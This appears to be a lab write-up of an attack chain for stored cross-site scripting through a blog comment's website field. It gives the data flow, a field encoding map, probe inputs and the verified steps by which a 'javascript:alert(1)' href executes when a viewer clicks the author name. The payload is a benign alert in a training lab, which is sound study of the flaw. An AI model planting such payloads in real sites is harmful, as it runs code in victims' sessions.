# Attack Chain — Stored javascript: href via comment website field

## Data flow
```
Attacker (own session):
    GET /post?postId=1 → session cookie + csrf token
    POST /post/comment { csrf, postId=1, comment="click my name",
                         name="ClickMe", email=…, website="javascript:alert(1)" }
        → 302 (no scheme validation, stored verbatim)
   │
   ▼
Storage (persists across sessions/viewers)
   │
   ▼
Any viewer GETs /post?postId=1 → server renders stored comment:
    <a id="author" href="javascript:alert(1)">ClickMe</a>
   │  whole-value payload — no breakout characters needed or usable
   ▼
[INTERACTION GATE] viewer clicks the author name (native blog UI)
   │
   ▼
[TRUST BOUNDARY CROSSED] browser follows javascript: URI → code runs in app
origin with the VIEWER's cookies/context
   ▼
RESULT: alert(1) in victim origin → lab acceptance
```

## Full field map (this build — differs from the first stored lab)
| Field | Rendered as | Encoding observed | Verdict |
|---|---|---|---|
| `website` | `<a id="author" href="…">` | `"`→`&quot;`; `'` `<` `>` raw | **SINK — scheme unvalidated** |
| `name` | anchor text | `&quot; &apos; &lt; &gt;` full | dead |
| `comment` | `<p>` text | `&lt; &gt;` (fully neutralized) | dead (contrast: raw in first stored lab) |
| `email` | not reflected | — | no sink |

Probe evidence: `website=https://WSMARK.example.com/a"'<>b` →
`href="https://WSMARK.example.com/a&quot;'<>b"`; `comment=CMTPROBE<<<>>>` →
`<p>CMTPROBE&lt;&lt;&lt;&gt;&gt;&gt;</p>`.

## Why `javascript:` and why no breakout
- `"` is encoded → attribute termination impossible (title's stated defense, verified).
- `<`/`>` survive raw inside the value but are INERT there (tag-open only parses
  outside tags) — no tag injection possible from inside an attribute value.
- The remaining degree of freedom is the value ITSELF: `href` interprets URI schemes,
  and `javascript:` turns navigation into execution. The defense encoded the delimiter
  but never restricted what the value may BE.

## Expected response sequence (verified)
1. `GET /post?postId=1` → 200 + csrf; `POST /post/comment` → 302.
2. Re-GET shows `<a id="author" href="javascript:alert(1)">ClickMe</a>` verbatim.
3. Click (CDP programmatic proof with `void(title)` variant; real-browser acceptance
   click with `alert(1)`) → code runs in page origin.